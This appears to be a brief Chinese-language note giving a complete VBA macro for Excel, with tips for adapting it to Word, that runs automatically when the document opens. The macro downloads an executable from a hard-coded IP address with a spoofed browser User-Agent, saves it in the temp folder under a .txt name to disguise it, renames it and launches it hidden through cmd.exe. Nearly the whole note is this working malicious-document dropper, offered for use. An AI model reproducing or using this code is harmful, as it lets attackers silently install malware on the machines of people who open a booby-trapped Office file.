# xls-宏-下载文件重命名并执行

其实就是vb脚本  

```vb
Option Explicit
#If VBA7 Then
    Private Declare PtrSafe Function GetDC Lib "user32" (ByVal hWnd As LongPtr) As LongPtr
    Private Declare PtrSafe Function ReleaseDC Lib "user32" (ByVal hWnd As LongPtr, ByVal hdc As LongPtr) As Long
    Private Declare PtrSafe Function GetDeviceCaps Lib "gdi32" (ByVal hdc As LongPtr, ByVal nIndex As Long) As Long
#Else
    Private Declare Function GetDC Lib "user32" (ByVal hWnd As Long) As Long
    Private Declare Function ReleaseDC Lib "user32" (ByVal hWnd As Long, ByVal hdc As Long) As Long
    Private Declare Function GetDeviceCaps Lib "gdi32" (ByVal hdc As Long, ByVal nIndex As Long) As Long
#End If

Private Object1, Object2, Object3


Sub Workbook_Open()
Set Object1 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): CallByName Object1, "Open", 1, "GET", "http://118.89.219.28/test.exe", False
CallByName Object1, "setRequestHeader", 1, "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
CallByName Object1, "Send", 1
Set Object2 = CreateObject("ADODB.Stream"): CallByName Object2, "Open", 1: Object2.Type = 1
CallByName Object2, "Write", 1, CallByName(Object1, "ResponseBody", 2)
CallByName Object2, "SaveToFile", 1, Environ("TEMP") & "\test.txt", 2
CallByName Object2, "Close", 1
Set Object3 = CreateObject("WScript.Shell")
CallByName Object3, "Run", 1, "cmd.exe /c ren ""%temp%\test.txt"" ""test.exe"" & start %temp%\test.exe ", 0, True
End Sub
```


注意：  
将该代码放在ThisWorkbook中且保证函数名为Workbook_Open，才能实现打开文档自动执行  
类似，如果想在word文档中实现自动执行的效果，将改代码放在ThisDocument中且保证函数名为Docment_Open即可  


2019/9/18  
